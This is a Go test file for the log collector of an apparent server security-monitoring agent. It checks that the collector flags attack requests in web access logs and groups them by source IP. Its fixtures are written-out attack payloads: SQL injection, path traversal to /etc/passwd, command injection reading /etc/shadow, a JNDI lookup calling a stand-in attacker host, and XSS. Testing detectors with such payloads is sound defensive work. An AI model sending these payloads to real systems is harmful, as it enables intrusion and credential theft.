package collector

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"vps-soc/agent/internal/event"
)

func TestClassifyRequest(t *testing.T) {
	cases := []struct {
		line string
		want []string
		tool string
	}{
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /produtos?id=1%20UNION%20SELECT%20password,2%20FROM%20users HTTP/1.1" 200 512 "-" "Mozilla/5.0"`, []string{WebSQLi}, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /login?user=admin'%20OR%20'1'='1 HTTP/1.1" 401 0 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"`, []string{WebSQLi}, "sqlmap"},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /download?file=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1" 404 0 "-" "curl/8"`, []string{WebTraversal}, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /ping?host=1.1.1.1;cat%20/etc/shadow HTTP/1.1" 500 0 "-" "x"`, []string{WebTraversal, WebCmdInjection}, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 10 "-" "${jndi:ldap://evil.example/a}"`, []string{WebJNDI}, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 10 "-" "x"`, []string{WebXSS}, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /.env HTTP/1.1" 404 0 "-" "x"`, []string{WebSensitiveFile}, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "POST /wp-login.php HTTP/1.1" 404 0 "-" "x"`, []string{WebAdminProbe}, ""},
		// Normal traffic stays quiet.
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /api/cursos?page=2&sort=nome HTTP/2.0" 200 9000 "https://site/" "Mozilla/5.0"`, nil, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /blog/como-selecionar-o-melhor-plano HTTP/2.0" 200 9000 "-" "Mozilla/5.0"`, nil, ""},
		{`45.1.2.3 - - [13/Nov/2026:10:00:00 +0000] "GET /_next/static/chunks/app.js HTTP/2.0" 200 9000 "-" "Mozilla/5.0"`, nil, ""},
	}
	for _, c := range cases {
		r, ok := ParseAccessLine(c.line)
		if !ok {
			t.Fatalf("not parsed: %s", c.line)
		}
		got, tool := ClassifyRequest(r)
		if fmt.Sprint(got) != fmt.Sprint(c.want) || tool != c.tool {
			t.Errorf("%s\n  got %v %q, want %v %q", r.Target, got, tool, c.want, c.tool)
		}
	}
}

func TestWebLogMonitorAggregatesPerIP(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "access.log")
	if err := os.WriteFile(logPath, []byte(`9.9.9.9 - - [x] "GET /.env HTTP/1.1" 404 0 "-" "old line, before the agent"`+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	events := make(chan event.Event, 10)
	m := &WebLogMonitor{Patterns: []string{filepath.Join(dir, "*access*.log")}, Window: 1500 * time.Millisecond,
		Emit: func(e event.Event) { events <- e }}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go m.Run(ctx)
	time.Sleep(200 * time.Millisecond)

	f, _ := os.OpenFile(logPath, os.O_APPEND|os.O_WRONLY, 0)
	for i := 0; i < 3; i++ {
		fmt.Fprintf(f, `45.1.2.3 - - [13/Nov/2026:10:00:0%d +0000] "GET /item?id=%d%%20union%%20select%%201,2 HTTP/1.1" 500 0 "-" "sqlmap/1.7"`+"\n", i, i)
	}
	fmt.Fprintln(f, `45.1.2.3 - - [13/Nov/2026:10:00:05 +0000] "GET / HTTP/1.1" 200 10 "-" "Mozilla/5.0"`) // normal: not counted
	fmt.Fprint(f, `127.0.0.1 - - [13/Nov/2026:10:00:06 +0000] "GET /.env HTTP/1.1" 404 0 "-" "x"`+"\n")    // loopback: ignored
	f.Close()

	select {
	case e := <-events:
		if e.Type != event.WebAttack || e.SourceIP != "45.1.2.3" {
			t.Fatalf("got %+v", e)
		}
		if e.Metadata["requests"] != 3 || e.Metadata["exploitRequests"] != 3 || e.Metadata["tool"] != "sqlmap" {
			t.Fatalf("metadata %v", e.Metadata)
		}
	case <-time.After(4 * time.Second):
		t.Fatal("no WEB_ATTACK event")
	}
	select {
	case e := <-events:
		t.Fatalf("unexpected second event %+v (old line or loopback reported)", e)
	case <-time.After(1800 * time.Millisecond):
	}
}
